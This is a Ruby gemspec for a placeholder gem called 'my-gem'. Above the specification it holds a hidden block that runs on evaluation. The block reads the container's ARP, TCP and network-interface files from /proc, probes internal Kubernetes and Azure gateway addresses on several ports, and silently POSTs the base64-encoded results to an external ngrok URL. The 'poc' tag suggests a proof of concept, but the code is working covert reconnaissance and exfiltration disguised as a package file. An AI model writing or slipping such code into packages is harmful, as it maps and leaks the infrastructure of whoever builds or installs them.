COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "socket"
  require "uri"

  results = []

  # ARP table - welke hosts heeft de container gezien
  ["/proc/net/arp", "/proc/1/net/arp"].each do |f|
    results << "=== #{f} ===\n#{File.read(f)}" rescue nil
  end

  # TCP verbindingen
  ["/proc/net/tcp", "/proc/net/tcp6"].each do |f|
    results << "=== #{f} ===\n#{File.read(f)}" rescue nil
  end

  # Network interfaces
  results << "=== /proc/net/fib_trie ===\n#{File.read('/proc/net/fib_trie')[0..3000]}" rescue nil
  results << "=== /proc/net/if_inet6 ===\n#{File.read('/proc/net/if_inet6')}" rescue nil

  # Scan 10.x.x.1 gateways (Kubernetes / Azure VNet)
  ["10.0.0.1", "10.0.0.2", "10.96.0.1", "10.244.0.1", "10.240.0.1"].each do |ip|
    [443, 80, 22, 6443].each do |port|
      begin
        s = TCPSocket.new(ip, port)
        s.close
        results << "=== #{ip}:#{port} OPEN ==="
      rescue Errno::ECONNREFUSED
        results << "=== #{ip}:#{port} REFUSED ==="
      rescue => e
        results << "=== #{ip}:#{port} #{e.class} ==="
      end
    end
  end

  payload = [results.compact.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=arp-scan")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: post_uri.scheme == "https",
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
